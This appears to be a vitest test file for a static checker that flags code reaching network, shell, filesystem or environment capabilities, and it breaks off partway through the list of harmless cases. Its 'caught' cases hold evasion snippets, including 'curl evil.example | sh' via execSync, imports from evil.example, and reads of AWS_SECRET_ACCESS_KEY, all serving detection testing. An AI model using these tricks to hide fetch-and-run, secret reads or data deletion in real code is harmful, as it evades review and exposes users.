// Adversarial suite from the v0.1 launch review: ways an edit (human or AI) might reach a
// capability without a diagnostic. Every case under "caught" must stay caught. Every case under
// "silent" is harmless and must produce no diagnostics at all. Every case under "known misses"
// documents a gap; its test fails once the gap is fixed, so move it to "caught".
// Runs as its own project with lib.dom so browser globals resolve the way they do in real apps.

import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { checkTsConfig, type Report } from "../src/check.js";
import { removeTemporary } from "./temporary.js";

const caught: Record<string, string> = {
  a01_alias: "export async function t(u: string) { const f = fetch; return f(u); }",
  a02_destructure: "export async function t(u: string) { const { fetch: g } = globalThis; return g(u); }",
  a03_computed_global: "export async function t(u: string) { return (globalThis as any)[\"fet\" + \"ch\"](u); }",
  a04_map_callback: "export async function t(us: string[]) { return Promise.all(us.map(fetch)); }",
  a05_then: "export async function t(u: string) { return Promise.resolve(u).then(fetch); }",
  a06_higher_order: "function run<T>(fn: () => T) { return fn(); }\nexport async function t(u: string) { return run(() => fetch(u)); }",
  a07_settimeout: "export function t(u: string) { setTimeout(() => { void fetch(u); }, 0); }",
  a09_dynamic_import_cp: "export async function t() { const cp = await import(\"node:child_process\"); cp.exec(\"ls\"); }",
  a10_createrequire: "import { createRequire } from \"node:module\";\nexport function t() { const r = createRequire(import.meta.url); r(\"child_process\").exec(\"ls\"); }",
  a11_env_destructure: "export function t() { const { SECRET } = process.env; return SECRET; }",
  a12_env_whole: "export function t() { return JSON.stringify(process.env); }",
  a13_env_entries: "export function t() { return Object.entries(process.env); }",
  a14_env_import: "import { env } from \"node:process\";\nexport function t() { return env.SECRET; }",
  a15_optional_call: "export async function t(u: string) { return fetch?.(u); }",
  a16_comma: "export async function t(u: string) { return (0, fetch)(u); }",
  a17_reflect_apply: "export async function t(u: string) { return Reflect.apply(fetch, undefined, [u]); }",
  a18_map_store: "const m = new Map<string, (u: string) => Promise<Response>>([[\"x\", fetch]]);\nexport async function t(u: string) { return m.get(\"x\")!(u); }",
  a19_getter: "const o = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { return o.data; }",
  a22_new_url: "export async function t() { return fetch(new URL(\"/x\", \"https://evil.example\")); }",
  a23_https_options: "import https from \"node:https\";\nexport function t() { return https.get({ host: \"evil.example\", path: \"/x\" }); }",
  a24_write_stream: "import { createWriteStream } from \"node:fs\";\nexport function t() { createWriteStream(\"./out.txt\").write(\"x\"); }",
  a25_fs_promises_append: "import fs from \"node:fs\";\nexport async function t() { await fs.promises.appendFile(\"./out.txt\", \"x\"); }",
  a26_worker_eval: "import { Worker } from \"node:worker_threads\";\nexport function t() { return new Worker(\"require(\\\"child_process\\\").exec(\\\"ls\\\")\", { eval: true }); }",
  a27_class_method: "class C { go(u: string) { return fetch(u); } }\nexport function t(u: string) { return new C().go(u); }",
  a28_interface_dispatch: "interface S { send(u: string): Promise<unknown> }\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function make(): S { return new Real(); }\nexport function t(s: S, u: string) { return s.send(u); }",
  a29_tagged_template: "const tag = (s: TemplateStringsArray) => fetch(s[0]);\nexport function t() { return tag`https://evil.example/x`; }",
  a30_async_iter: "async function* gen(u: string) { yield await fetch(u); }\nexport async function t(u: string) { for await (const r of gen(u)) return r; }",
  a32_eval_indirect: "export function t(s: string) { return (0, eval)(s); }",
  a33_vm: "import vm from \"node:vm\";\nexport function t(s: string) { return vm.runInNewContext(s); }",
  a34_child_spawn_sync: "import { spawnSync } from \"node:child_process\";\nexport function t() { return spawnSync(\"ls\"); }",
  a35_fs_rm: "import { rmSync } from \"node:fs\";\nexport function t() { rmSync(\"./data\", { recursive: true }); }",
  a36_globalthis_process: "export function t() { return globalThis.process?.env?.SECRET; }",
  a37_bind: "export async function t(u: string) { const f = fetch.bind(globalThis); return f(u); }",
  a38_array_fn: "const fns = [fetch];\nexport async function t(u: string) { return fns[0](u); }",
  a39_object_fn: "const api = { go: fetch };\nexport async function t(u: string) { return api.go(u); }",
  a40_return_fn: "function pick() { return fetch; }\nexport async function t(u: string) { return pick()(u); }",
  b01_ns_bracket_noany: "import * as cp from \"node:child_process\";\nexport function t() { return cp[\"exec\"](\"ls\"); }",
  b02_self_noany: "export async function t(u: string) { return self.fetch(u); }",
  b07_unknown_cast: "export async function t(u: string) { return (fetch as unknown as (u: string) => Promise<Response>)(u); }",
  b08_proxy_typed: "const p = new Proxy({} as { go: typeof fetch }, { get: () => fetch });\nexport function t(u: string) { return p.go(u); }",
  b10_window: "export async function t(u: string) { return window.fetch(u); }",
  a08_settimeout_string: "export function t() { (setTimeout as any)(\"require(\\\"child_process\\\").exec(\\\"ls\\\")\", 0); }",
  a21_namespace_bracket: "import * as cp from \"node:child_process\";\nexport function t() { return (cp as any)[\"exec\"](\"ls\"); }",
  a31_window_self: "export async function t(u: string) { return (self as any).fetch(u); }",
  b03_globalthis_any_dot: "export async function t(u: string) { return (globalThis as any).fetch(u); }",
  b04_any_var: "export async function t(u: string) { const x: any = fetch; return x(u); }",
  b06_any_require: "declare const require: any;\nexport function t() { return require(\"child_process\").exec(\"ls\"); }",
  b09_any_module: "import * as cp from \"node:child_process\";\nconst m: any = cp;\nexport function t() { return m.exec(\"ls\"); }",
  b11_ts_ignore: "export async function t(u: string) {\n  // @ts-ignore\n  return globalThis.fetchh ? 0 : (globalThis as Record<string, any>).fetch(u);\n}",
  c01_any_param: "import * as cp from \"node:child_process\";\nfunction use(m: any) { return m.exec(\"ls\"); }\nexport function t() { return use(cp); }",
  c02_let_assign: "import * as cp from \"node:child_process\";\nexport function t() { let m: any; m = cp; return m.exec(\"ls\"); }",
  c03_require_cast: "export function t() { return (require as any)(\"child_process\").exec(\"ls\"); }",
  c04_unknown_shape_global: "export async function t(u: string) { return (globalThis as unknown as { fetch(u: string): Promise<unknown> }).fetch(u); }",
  c05_unknown_shape_module: "import * as cp from \"node:child_process\";\nexport function t() { return (cp as unknown as { exec(c: string): void }).exec(\"ls\"); }",
  c06_process_env_any: "export function t() { return (process as any).env.SECRET; }",
  c07_window_computed_call: "export function t(k: string, u: string) { return (window as any)[k](u); }",
  c08_return_module_as_any: "import * as cp from \"node:child_process\";\nfunction get(): any { return cp; }\nexport function t() { return get().exec(\"ls\"); }",
  c09_fs_promises_any: "import fs from \"node:fs\";\nexport async function t() { return (fs as any).promises.rm(\"./data\"); }",
  c11_module_cast_stored: "import * as cp from \"node:child_process\";\nexport function t() { const m = cp as any; return m.exec(\"ls\"); }",
  c12_nested_global_env: "export function t() { return (globalThis as any).process.env.SECRET; }",
  c13_module_unknown_member: "import fs from \"node:fs\";\nexport function t() { return (fs as any).someNewWrite(\"./x\"); }",
  c14_module_computed_read: "import * as cp from \"node:child_process\";\nexport function t(k: string) { const run = (cp as any)[k]; return run(\"ls\"); }",
  // An interface implemented by naming a function elsewhere, instead of writing the method.
  d01_impl_shorthand: "interface S { send(u: string): Promise<unknown> }\nfunction send(u: string) { return fetch(u); }\nexport function make(): S { return { send }; }\nexport function t(s: S, u: string) { return s.send(u); }",
  d02_impl_property: "interface S { send(u: string): Promise<unknown> }\nfunction post(u: string) { return fetch(u); }\nexport function make(): S { return { send: post }; }\nexport function t(s: S, u: string) { return s.send(u); }",
  d03_impl_class_field: "interface S { send(u: string): Promise<unknown> }\nfunction post(u: string) { return fetch(u); }\nclass Real implements S { send = post; }\nexport function make(): S { return new Real(); }\nexport function t(s: S, u: string) { return s.send(u); }",
  d04_impl_diamond: "interface A { send(u: string): Promise<unknown> }\ninterface B extends A {}\ninterface C extends A {}\ninterface D extends B, C {}\nclass Real implements D { send(u: string) { return fetch(u); } }\nexport function make(): D { return new Real(); }\nexport function t(s: A, u: string) { return s.send(u); }",
  d05_object_names_function: "function post(u: string) { return fetch(u); }\nconst api = { go: post };\nexport function t(u: string) { return api.go(u); }",
  d06_computed_method: "class Api { get(u: string) { return fetch(u); } put(u: string) { return u; } }\nconst api = new Api();\nexport function t(k: \"get\" | \"put\", u: string) { return api[k](u); }",
  d07_array_destructure_iterator: "class Feed { *[Symbol.iterator]() { yield fetch(\"https://evil.example/x\"); } }\nexport function t() { const [first] = new Feed(); return first; }",
  // The older angle-bracket casts, and the environment read past a cast in other forms.
  e01_angle_any_env: "export function t() { return (<any>process).env.SECRET; }",
  e02_any_env_bracket: "export function t() { return (process as any).env[\"SECRET\"]; }",
  e03_any_env_whole: "export function t() { return Object.keys((process as any).env); }",
  e04_angle_unknown_shape: "export async function t(u: string) { return (<{ fetch(u: string): Promise<unknown> }><unknown>globalThis).fetch(u); }",
  e05_any_member_as_value: "export function t() { const f = (globalThis as any).fetch; return f; }",
  // Engine review (0.4): import() through a traced specifier, require() of a database client, URL imports.
  en01_import_const_spec: "const spec = \"node:child_process\";\nexport async function t() { const cp = await import(spec); cp.exec(\"ls\"); }",
  en02_import_as_const: "const M = { cp: \"node:child_process\" } as const;\nexport async function t() { (await import(M.cp)).execSync(\"id\"); }",
  en03_import_enum: "enum Mod { Fs = \"node:fs\" }\nexport async function t() { (await import(Mod.Fs)).writeFileSync(\"/etc/x\", \"y\"); }",
  en04_import_env_module: "const p = \"node:process\";\nexport async function t() { return (await import(p)).env.AWS_SECRET_ACCESS_KEY; }",
  en05_import_annotated: "const spec = \"node:child_process\";\n/** @perm net(api.example.com) */\nexport async function t() { const cp = await import(spec); cp.exec(\"curl evil.example | sh\"); return fetch(\"https://api.example.com/\"); }",
  en06_require_pg: "export function t() { const pg = require(\"pg\"); return new pg.Pool().query(\"DELETE FROM users\"); }",
  en07_data_import: "import \"data:text/javascript,fetch('https://evil.example/')//.css\";\nexport const x = 1;",
  en08_https_import: "import \"https://evil.example/payload.js\";\nexport const x = 1;",
  en09_dynamic_data_import: "export async function t() { return import(\"data:text/javascript,export default 1\"); }",
  en10_require_blob: "export function t() { return require(\"blob:nodedata:1234\"); }",
  // Engine review (0.4): calls through interfaces that reached no implementation.
  en11_fnprop_interface_class: "interface S { send: (u: string) => Promise<unknown> }\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function make(): S { return new Real(); }\nexport function t(s: S, u: string) { return s.send(u); }",
  en12_fnprop_interface_literal: "interface S { send: (u: string) => Promise<unknown> }\nconst impl: S = { send: (u) => fetch(u) };\nexport function t(s: S = impl, u = \"\") { return s.send(u); }",
  en13_type_alias_implements: "type S = { send(u: string): Promise<unknown> };\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send(u); }",
  en14_interface_extends_alias: "type Base = { send(u: string): Promise<unknown> };\ninterface S extends Base {}\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send(u); }",
  en15_structural_class: "interface S { send(u: string): Promise<unknown> }\nclass Real { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send(u); }",
  en16_untyped_literal: "interface S { send(u: string): Promise<unknown> }\nconst impl = { send(u: string) { return fetch(u); } };\nexport function t(s: S = impl, u = \"\") { return s.send(u); }",
  en17_method_reference_map: "interface S { send(u: string): Promise<unknown> }\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, us: string[]) { return Promise.all(us.map(s.send)); }",
  en18_method_reference_call: "interface S { send(u: string): Promise<unknown> }\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send.call(s, u); }",
  en19_abstract_getter: "export abstract class B { abstract get url(): string; go() { return this.url; } }\nclass C extends B { get url() { void fetch(\"https://evil.example/\"); return \"\"; } }",
  en20_interface_getter: "interface S { readonly url: string }\nclass C implements S { get url() { void fetch(\"https://evil.example/\"); return \"\"; } }\nexport function t(s: S) { return s.url; }",
  // Engine review (0.4): entry points that weren't treated as exported, and plain decorators.
  en22_export_default_hoc: "import { execSync } from \"node:child_process\";\nfunction withAuth(fn: (q: string) => void) { return (q: string) => { if (q) fn(q); }; }\nfunction handler(q: string) { execSync(q); }\nexport default withAuth(handler);",
  en23_export_default_object_ref: "import { execSync } from \"node:child_process\";\nfunction handleRequest(q: string) { execSync(q); }\nexport default { fetch: handleRequest };",
  en24_route_array: "import { execSync } from \"node:child_process\";\nexport const routes = [{ path: \"/\", handler: () => execSync(\"ls\") }];",
  en25_toplevel_route_object: "import { execSync } from \"node:child_process\";\ndeclare const app25: { route(r: { url: string; handler: (q: string) => void }): void };\napp25.route({ url: \"/run\", handler: (q) => { execSync(q); } });",
  en26_toplevel_route_method: "import { execSync } from \"node:child_process\";\ndeclare const app26: { route(r: { url: string; handler(q: string): void }): void };\napp26.route({ url: \"/run\", handler(q) { execSync(q); } });",
  en27_export_equals_function: "import { execSync } from \"node:child_process\";\nfunction run() { execSync(\"ls\"); }\nexport = run;",
  en28_export_equals_object: "import { execSync } from \"node:child_process\";\nexport = { run() { execSync(\"ls\"); } };",
  en29_dotted_namespace: "import { execSync } from \"node:child_process\";\nexport namespace A.B { export function run() { execSync(\"ls\"); } }",
  en30_static_object_in_class: "import { execSync } from \"node:child_process\";\nexport class C { static helpers = { run() { execSync(\"ls\"); } }; }",
  en31_nested_export_literal: "import { execSync } from \"node:child_process\";\nexport const api = { v1: { run() { execSync(\"ls\"); } } };",
  en32_config_plugin_hook: "import { execSync } from \"node:child_process\";\ndeclare function defineConfig(c: { plugins: { name: string; buildStart?(): void }[] }): unknown;\nexport default defineConfig({ plugins: [{ name: \"x\", buildStart() { execSync(\"curl evil.example | sh\"); } }] });",
  en33_object_passed_by_function: "import { execSync } from \"node:child_process\";\ndeclare const app33: { use(r: object): void };\n/** @perm env(PORT) */\nexport function register() { const routes = { run: (q: string) => { execSync(q); } }; app33.use(routes); return process.env.PORT; }",
  en34_inline_object_passed: "import { execSync } from \"node:child_process\";\ndeclare const app34: { use(r: object): void };\n/** @perm env(PORT) */\nexport function register() { app34.use({ run(q: string) { execSync(q); } }); return process.env.PORT; }",
  // Was a known miss: a Proxy's handler is an object of functions handed to a call, so its
  // traps are now entry points (or charged to the function creating it), though calls through
  // the Proxy still aren't linked to them.
  a20_proxy: "const p = new Proxy({}, { get: () => fetch });\nexport function t(u: string) { return (p as any).anything(u); }",
  en35_class_decorator: "import { execSync } from \"node:child_process\";\nfunction logged(c: unknown, _ctx: ClassDecoratorContext) { execSync(\"ls\"); }\n@logged class C {}\nexport { C };",
  en36_member_decorator: "import { execSync } from \"node:child_process\";\nfunction traced(m: unknown, _ctx: ClassMethodDecoratorContext) { execSync(\"ls\"); }\nexport class C { @traced m() {} }",
  en37_decorator_member_access: "import { execSync } from \"node:child_process\";\nconst reg = { track(c: unknown, _x: ClassDecoratorContext) { execSync(\"ls\"); } };\n@reg.track class C {}\nexport { C };",
  // Engine review (0.4): methods the language calls implicitly, and classes built by expressions.
  en38_object_spread_getter: "const o38 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { return { ...o38 }; }",
  en39_quoted_destructure_getter: "const o39 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { const { \"data\": d } = o39; return d; }",
  en40_destructuring_assignment_getter: "const o40 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { let d: unknown; ({ data: d } = o40); return d; }",
  en41_valueof_multiply: "const o41 = { valueOf() { void fetch(\"https://evil.example/x\"); return 1; } };\n// @ts-expect-error: arithmetic on an object runs its valueOf()\nexport function t() { return o41 * 2; }",
  en42_valueof_unary_plus: "const o42 = { valueOf() { void fetch(\"https://evil.example/x\"); return 1; } };\nexport function t() { return +o42; }",
  en43_valueof_compare: "const o43 = { valueOf() { void fetch(\"https://evil.example/x\"); return 1; } };\nexport function t() { return o43 < 3; }",
  en44_valueof_compound: "const o44 = { toString() { void fetch(\"https://evil.example/x\"); return \"\"; } };\nexport function t() { let s = \"\"; s += o44; return s; }",
  en45_yield_star: "class Feed45 { *[Symbol.iterator]() { yield fetch(\"https://evil.example/x\"); } }\nexport function* t() { yield* new Feed45(); }",
  en46_using_dispose: "class Res46 { [Symbol.dispose]() { void fetch(\"https://evil.example/x\"); } }\nexport function t() { using r = new Res46(); return r; }",
  en47_await_using: "class Res47 { async [Symbol.asyncDispose]() { void fetch(\"https://evil.example/x\"); } }\nexport async function t() { await using r = new Res47(); return r; }",
  en48_instanceof: "class K48 { static [Symbol.hasInstance](x: unknown) { void fetch(\"https://evil.example/x\"); return x !== null; } }\nexport function t(x: unknown) { return x instanceof K48; }",
  en49_class_expression_returned: "import { execSync } from \"node:child_process\";\nfunction make() { return class { x = execSync(\"ls\"); }; }\nexport function t() { const K = make(); return new K(); }",
  en50_inline_class_expression: "import { execSync } from \"node:child_process\";\nexport function t() { return new (class { x = execSync(\"ls\"); })(); }",
  en51_mixin: "import { execSync } from \"node:child_process\";\ntype Ctor = new (...a: any[]) => object;\nfunction Loud<T extends Ctor>(Base: T) { return class extends Base { constructor(...a: any[]) { super(...a); execSync(\"ls\"); } }; }\nclass Plain {}\nexport class Mixed extends Loud(Plain) {}",
  en52_mixin_field: "import { execSync } from \"node:child_process\";\ntype Ctor = new (...a: any[]) => object;\nfunction Loud<T extends Ctor>(Base: T) { return class extends Base { x = execSync(\"ls\"); }; }\nclass Plain {}\nexport function t() { return new (Loud(Plain))(); }",
  // An object of functions passed as an argument by a function is charged to that function (q isn't exported,
  // so only the link from q, through t, catches these).
  en53_arrow_in_object_argument: "declare function lib53(o: { where: () => unknown }): unknown;\nfunction q(u: string) { return lib53({ where: () => fetch(u) }); }\n/** @perm env(MODE) */\nexport function t(u: string) { return q(u); }",
  en54_arrow_in_nested_argument: "declare function lib54(o: { hooks: { where: () => unknown }[] }): unknown;\nfunction q(u: string) { return lib54({ hooks: [{ where: () => fetch(u) }] }); }\n/** @perm env(MODE) */\nexport function t(u: string) { return q(u); }",
  en55_valueof_through_and: "const o55 = { valueOf() { void fetch(\"https://evil.example/x\"); return 1; } };\n// @ts-expect-error: arithmetic on an object runs its valueOf()\nexport function t(f: boolean) { return (f && o55) * 2; }",
  en56_destructuring_assignment_rest: "const o56 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { let r: object; ({ ...r } = o56); return r; }",
  en57_array_destructuring_assignment: "class Feed57 { *[Symbol.iterator]() { yield fetch(\"https://evil.example/x\"); } }\nexport function t() { let a: unknown; [a] = new Feed57(); return a; }",
  en58_new_through_union: "import { execSync } from \"node:child_process\";\nclass Loud { x = execSync(\"ls\"); }\nclass Quiet {}\nexport function t(c: boolean) { const K = c ? Loud : Quiet; return new K(); }",
  en59_computed_key_destructure: "const KEY = \"data\";\nconst o59 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { const { [KEY]: d } = o59; return d; }",
  en60_dynamic_key_destructure: "const o60 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t(k: \"data\") { const { [k]: d } = o60; return d; }",
  en61_numeric_key_destructure: "const o61 = { get 0() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { const { 0: d } = o61; return d; }",
  en62_spread_then_operator: "const o62 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { const s = { ...o62 } + \"\"; return s; }",
  en63_array_of_objects_passed: "import { execSync } from \"node:child_process\";\ndeclare const app63: { use(r: object[]): void };\nfunction register() { const routes = [{ path: \"/\", run(q: string) { execSync(q); } }]; app63.use(routes); }\n/** @perm env(PORT) */\nexport function start() { register(); return process.env.PORT; }",
  en64_nested_namespace: "import { execSync } from \"node:child_process\";\nexport namespace Outer { export namespace Inner { export function run() { execSync(\"ls\"); } } }",
  en65_for_loop_function: "export function t() { for (const f = () => fetch(\"https://x.example/\"); ; ) { return f(); } }",
  en66_export_equals_class: "import { execSync } from \"node:child_process\";\nexport = class { m() { execSync(\"m\"); } };",
  en67_require_absolute: "export function t() { return require(\"/opt/app/missing.js\"); }",
  en21_generic_alias: "type Repo<T> = { load(id: string): Promise<T> };\nclass Leads implements Repo<string> { async load(id: string) { return (await fetch(\"https://leads.example/\" + id)).text(); } }\nexport function t(r: Repo<string>, id: string) { return r.load(id); }",
  // Found in the 0.3 review: a const alias used as a value, rather than called.
  f01_alias_call: "import { execSync } from \"node:child_process\";\nconst run = execSync;\nexport function t() { return run.call(null, \"id\"); }",
  f02_alias_reflect_apply: "import { execSync } from \"node:child_process\";\nconst run = execSync;\nexport function t() { return Reflect.apply(run, null, [\"id\"]); }",
  f03_alias_map: "const get = fetch;\nexport function t(us: string[]) { return us.map(get); }",
  f04_alias_then: "const get = fetch;\nexport function t(u: string) { return Promise.resolve(u).then(get); }",
  f05_alias_chain: "import * as cp from \"node:child_process\";\nconst a = cp.execSync;\nconst b = a;\nexport function t() { return [\"id\"].map(b); }",
  f06_object_member_value: "const api = { go: fetch };\nexport function t(us: string[]) { return us.map(api.go); }",
  // Constructors reached through an alias, a subclass, a parameter, or Reflect.construct.
  g01_ws_alias: "export function t() { const WS = WebSocket; return new WS(\"wss://evil.example/x\"); }",
  g02_ws_param: "export function t(C: typeof WebSocket) { return new C(\"wss://evil.example/x\"); }",
  g03_ws_subclass: "class Sock extends WebSocket {}\nexport function t() { return new Sock(\"wss://evil.example/x\"); }",
  g04_ws_super: "class Sock extends WebSocket { constructor(u: string) { super(u); } }\nexport function t() { return new Sock(\"wss://evil.example/x\"); }",
  g05_reflect_construct_ws: "export function t() { return Reflect.construct(WebSocket, [\"wss://evil.example/x\"]); }",
  g06_reflect_construct_worker: "import { Worker } from \"node:worker_threads\";\nexport function t(c: string) { return Reflect.construct(Worker, [c, { eval: true }]); }",
  g07_reflect_construct_script: "import vm from \"node:vm\";\nexport function t(c: string) { return (Reflect.construct(vm.Script, [c]) as vm.Script).runInThisContext(); }",
  g08_eventsource_alias: "export function t() { const E = EventSource; return new E(\"https://evil.example/x\"); }",
  // Browser network and code-loading APIs in indirect forms.
  h01_beacon_call: "export function t(d: string) { return navigator.sendBeacon.call(navigator, \"https://evil.example/x\", d); }",
  h02_xhr_prototype_open: "export function t() { const x = new XMLHttpRequest(); XMLHttpRequest.prototype.open.call(x, \"GET\", \"https://evil.example/x\"); x.send(); }",
  h03_window_settimeout_string: "export function t() { window.setTimeout(\"fetch('https://evil.example/x')\", 0); }",
  h04_dom_worker: "export function t() { return new Worker(\"https://evil.example/w.js\"); }",
  h05_shared_worker: "export function t(u: string) { return new SharedWorker(u); }",
  h06_webtransport: "export function t() { return new WebTransport(\"https://evil.example/x\"); }",
  h07_settimeout_call_string: "export function t() { setTimeout.call(null, \"fetch('https://evil.example/x')\", 0); }",
  h08_settimeout_apply_list: "export function t(args: [string, number]) { setTimeout.apply(null, args); }",
  // Capability modules reaching `any` in ways other than a namespace import (the 0.3 review).
  i01_import_equals_cast: "import cp = require(\"child_process\");\nexport function t() { return (cp as any).exec(\"id\"); }",
  i02_import_equals_stored: "import cp = require(\"child_process\");\nexport function t() { const m: any = cp; return m.exec(\"id\"); }",
  i03_dynamic_import_cast: "export async function t() { const m = await import(\"node:child_process\"); return (m as any).exec(\"id\"); }",
  i04_dynamic_import_inline: "export async function t() { return ((await import(\"node:child_process\")) as any).exec(\"id\"); }",
  i05_barrel_cast: "import * as sys from \"./fp22_barrel.js\";\nexport function t() { return (sys as any).exec(\"id\"); }",
  i06_object_values: "import * as cp from \"node:child_process\";\nexport function t() { for (const f of Object.values(cp)) (f as any)(\"id\"); }",
  i07_unknown_param: "import * as cp from \"node:child_process\";\nfunction use(m: unknown) { return (m as any).exec(\"id\"); }\nexport function t() { return use(cp); }",
  i08_then_any_param: "import * as cp from \"node:child_process\";\nexport function t() { return Promise.resolve(cp).then((m: any) => m.exec(\"id\")); }",
  i09_globalthis_process_env: "export function t() { return (globalThis.process as any).env.SECRET; }",
  i10_computed_read_any: "import * as fs from \"node:fs\";\nexport function t(k: keyof typeof fs, p: string) { const f: any = fs[k]; return f(p, \"x\"); }",
  i11_computed_read_cast: "import * as fs from \"node:fs\";\nexport function t(k: keyof typeof fs, p: string) { const f = fs[k]; return (f as any)(p, \"x\"); }",
  i12_builtin_module_cast: "export function t() { return (process.getBuiltinModule(\"node:child_process\") as any).execSync(\"id\"); }",
  i13_process_cast_builtin_module: "export function t() { return (process as any).getBuiltinModule(\"child_process\").execSync(\"id\"); }",
  i14_reflect_get_module: "import * as cp from \"node:child_process\";\nexport function t(k: string) { return Reflect.get(cp, k)(\"id\"); }",
  i15_reflect_get_global: "export function t(u: string) { return Reflect.get(globalThis, \"fet\" + \"ch\")(u); }",
  i16_process_binding: "export function t() { return (process as any).binding(\"spawn_sync\").spawn({ file: \"sh\" }); }",
  i17_global_any_construct: "export function t(u: string) { return new (globalThis as any).WebSocket(u); }",
  i18_global_any_chain: "export function t(u: string, d: string) { return (window as any).navigator.sendBeacon(u, d); }",
  i19_global_any_worker: "export function t(c: string) { return new (window as any).Worker(c); }",
  // Computed calls over objects whose members are capabilities only through an alias or the platform.
  j01_platform_computed: "export function t(k: \"sendBeacon\" | \"javaEnabled\", u: string) { return (navigator[k] as (u: string) => unknown)(u); }",
  j02_record_of_alias: "import { execSync } from \"node:child_process\";\nconst run = execSync;\nconst ops: Record<string, (c: string) => unknown> = { run };\nexport function t(k: string) { return ops[k]!(\"id\"); }",
  j03_typed_injection: "import * as cp from \"node:child_process\";\nfunction runner(m: typeof cp) { return m.execSync(\"id\"); }\nexport function t() { return runner(cp); }",
  j04_promise_of_module: "import * as cp from \"node:child_process\";\nexport function t() { return Promise.resolve(cp).then((m) => m.execSync(\"id\")); }",
  j05_main_module_typed: "export function t() { return process.mainModule?.require(\"child_process\"); }",
  // More ways a value reaches a capability function, or a module loses its type.
  f07_uncurry: "export function t(u: string) { const send = fetch.call.bind(fetch); return send(null, u); }",
  f08_and_value: "export function t(on: boolean) { return on && fetch; }",
  f09_nullish_value: "export function t(polyfill: typeof fetch) { return globalThis.fetch ?? polyfill; }",
  f10_or_value: "export function t() { return [window.WebSocket || null]; }",
  h09_options_maybe: "import https from \"node:https\";\ndeclare const options: https.RequestOptions | undefined;\nexport function t() { return https.get(\"https://good.example/\", options); }",
  i20_object_param: "import * as cp from \"node:child_process\";\nfunction use(m: object) { return (m as any).exec(\"id\"); }\nexport function t() { return use(cp); }",
  i21_optional_empty_param: "import * as cp from \"node:child_process\";\nfunction use(m?: {}) { return (m as any).exec(\"id\"); }\nexport function t() { return use(cp); }",
  i22_record_param: "import * as cp from \"node:child_process\";\nfunction use(m: Record<string, unknown>) { return (m.exec as (c: string) => void)(\"id\"); }\nexport function t() { return use(cp); }",
  i23_nested_barrel: "import * as lib from \"./fp31_nested_barrel.js\";\nexport function t() { return (lib as any).cp.exec(\"id\"); }",
  i24_reflect_get_member: "export function t() { return Reflect.get(process, \"e\" + \"nv\").SECRET; }",
  i25_main_module_chain: "export function t() { return (globalThis as any).process.mainModule.require(\"child_process\").execSync(\"id\"); }",
  i26_stored_global_process: "export function t() { const p = (globalThis as any).process; return p.env.SECRET; }",
  i27_stored_module_member: "import fs from \"node:fs\";\nexport async function t() { const ops = (fs as any).promises; return ops.rm(\"./data\"); }",
  i28_reflect_get_index: "export function t(u: string) { return Reflect.get(window, \"fet\" + \"ch\")[\"call\"](window, u); }",
  i29_then_unknown_param: "import * as cp from \"node:child_process\";\nexport function t() { return Promise.resolve(cp).then((m: unknown) => (m as { exec(c: string): void }).exec(\"id\")); }",
  i30_process_bracket_binding: "export function t() {\n  // @ts-expect-error not in the types\n  return globalThis.process[\"binding\"](\"spawn_sync\");\n}",
  i31_long_reflect_get: "export async function t(fallbackName: string) { return Reflect.get(await import(\"node:child_process\"), process.argv[2] ?? fallbackName); }",
  i32_object_keys: "import * as fs from \"node:fs\";\nexport function t() { return Object.keys(fs); }",
  i33_object_entries: "import * as cp from \"node:child_process\";\nexport function t() { return Object.entries(cp); }",
  i34_computed_module_argument: "import * as fs from \"node:fs\";\nexport function t(k: keyof typeof fs, log: (x: unknown) => void) { log(fs[k]); }",
  i35_project_this: "import * as cp from \"node:child_process\";\nfunction run(this: unknown) { return (this as any).execSync(\"id\"); }\nexport function t() { return run.call(cp); }",
  i36_cast_function_this: "import * as cp from \"node:child_process\";\ndeclare const handler: (this: unknown) => void;\nexport function t() { return (handler as any).call(cp); }",
  j06_library_this: "import * as fs from \"node:fs\";\nexport function t() { return fs.readFileSync.bind(fs); }",
};

// Harmless code that must not be reported, including common `any` casts that reach no capability.
const silent: Record<string, string> = {
  fp01_datalayer: "export function t() { (window as any).dataLayer.push({ event: \"x\" }); }",
  fp02_app_state: "export function t() { return (globalThis as any).__APP_STATE__; }",
  fp03_mock_fetch: "export function t(mock: unknown) { (globalThis as any).fetch = mock; }",
  fp04_json_any: "export function t(s: string) { const data: any = JSON.parse(s); return data.items; }",
  fp05_obj_any: "export function t(o: { a: number }) { return (o as any).a; }",
  fp06_window_title: "export function t() { return (window as any).document.title; }",
  fp07_process_platform: "export function t() { return (process as any).platform; }",
  fp08_err_any: "export function t(e: unknown) { return (e as any).message; }",
  fp09_window_alias: "export function t() { const w = window as any; w.gtag(\"event\", \"x\"); }",
  fp10_process_exit: "export function t() { (process as any).exit(1); }",
  fp11_spy_on: "declare function spyOn(o: object, k: string): void;\nexport function t() { spyOn(globalThis as any, \"fetch\"); }",
  fp12_window_assign: "export function t() { Object.assign(window as any, { appVersion: \"1\" }); }",
  fp13_own_interface: "interface WindowOrWorkerGlobalScope { fetch(key: string): string }\ndeclare const cache: WindowOrWorkerGlobalScope;\nexport function t(k: string) { return cache.fetch(k); }",
  b05_any_param: "export async function t(f: any, u: string) { return f(u); }",
  fp14_window_computed_read: "export function t(k: string) { return (window as any)[k]; }",
  fp15_harmless_module_any: "import * as path from \"node:path\";\nexport function t() { const p: any = path; return p.join(\"a\", \"b\"); }",
  // Engine review (0.4): loading modules that touch nothing.
